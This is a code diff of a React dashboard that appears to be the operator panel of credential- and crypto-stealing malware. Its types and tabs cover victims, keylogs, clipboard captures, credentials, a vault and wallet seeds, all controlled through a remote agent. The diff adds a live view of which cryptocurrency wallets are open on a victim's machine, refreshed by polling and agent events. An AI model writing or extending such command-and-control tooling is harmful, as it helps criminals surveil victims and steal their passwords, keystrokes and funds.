@@ -1,11 +1,12 @@
 'use client';
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 import {
   Archive, Camera, CheckCircle2, Copy, ExternalLink, FileSearch, FolderOpen, KeyRound,
   Loader2, MessageSquare, Monitor, RefreshCw, Search, ShieldOff, Tag, TerminalSquare,
   Wallet as WalletIcon, X, AlertTriangle
 } from 'lucide-react';
 import { useApi, mutate } from '@/hooks/useApi';
+import { useLiveContext } from '@/components/live-provider';
 import { toast } from 'sonner';
 import type { Artifact, ClipboardEntry, Keylog, Task, VaultResponse, Victim } from '@/lib/types';
 import { ago, copy, dateTime, flag, osIcon, osTone, short } from '@/lib/format';
@@ -23,6 +24,31 @@ import { cn } from '@/lib/cn';
 import { ACTION_MAP } from '@/lib/actions';
 
 export type DetailTab = 'resumen' | 'boveda' | 'ficheros' | 'actividad' | 'monitor' | 'chat';
+
+type OpenWallet = { name: string; pid: number | null; at: string };
+
+function OpenWallets({ victim }: { victim: Victim }) {
+  const live = useLiveContext();
+  const last = live.events[0];
+  const { data, refresh } = useApi<{ items: OpenWallet[] }>(`/victims/${victim.id}/open-wallets`, { pollMs: 15_000 });
+  useEffect(() => {
+    if (last?.victimId === victim.id && ['event.new', 'wallet_detected', 'wallet_closed'].includes(last.type)) refresh();
+  }, [last?.at]); // eslint-disable-line react-hooks/exhaustive-deps
+  const items = data?.items ?? [];
+  return (
+    <section className="rounded-lg border border-line bg-panel/30 p-2">
+      <div className="flex items-center gap-2">
+        <p className="text-2xs uppercase tracking-wide text-muted">Wallets abiertas ahora</p>
+        <span className="ml-auto text-2xs text-muted/60">se refresca con el agente</span>
+      </div>
+      {items.length === 0 ? <p className="mt-1 text-2xs text-muted">Ninguna billetera en ejecución detectada en la última hora.</p> : (
+        <div className="mt-1 flex flex-wrap gap-1">
+          {items.map((item) => <Badge key={`${item.name}-${item.pid}`} tone="ok"><WalletIcon className="h-2.5 w-2.5" />{item.name}{item.pid ? ` · ${item.pid}` : ''}</Badge>)}
+        </div>
+      )}
+    </section>
+  );
+}
 type ActivityTab = 'keylogger' | 'portapapeles' | 'credenciales' | 'eventos';
 
 const TABS: Array<{ id: DetailTab; label: string }> = [
@@ -208,6 +234,8 @@ export function VictimDetail({
               />
             </div>
 
+            <OpenWallets victim={victim} />
+
             <div className="grid grid-cols-3 gap-2 sm:grid-cols-6">
               {[
                 ['wallets', counters?.wallets], ['targets', counters?.targets], ['seeds', counters?.seeds],
@@ -236,6 +264,7 @@ export function VictimDetail({
               <dt className="text-muted">Grupo</dt><dd>{victim.tags.length ? victim.tags.map((tag) => <Badge key={tag} className="mr-1">{tag}</Badge>) : '—'}</dd>
             </dl>
 
+            {victim.health ? <p className="rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad"><AlertTriangle className="mr-1 inline h-3 w-3" />Módulo degradado en los últimos 10 min: <span className="font-mono">{victim.health}</span>. Revisa la pestaña Actividad antes de fiarte del escaneo.</p> : null}
             {!victim.socket ? <p className="rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">Sin socket de control: las acciones se rechazarán con <span className="font-mono">agent_offline</span>. El estado online solo refleja el último heartbeat.</p> : null}
             {lastScan?.error ? <p className="rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad"><AlertTriangle className="mr-1 inline h-3 w-3" />{lastScan.error}</p> : null}
 
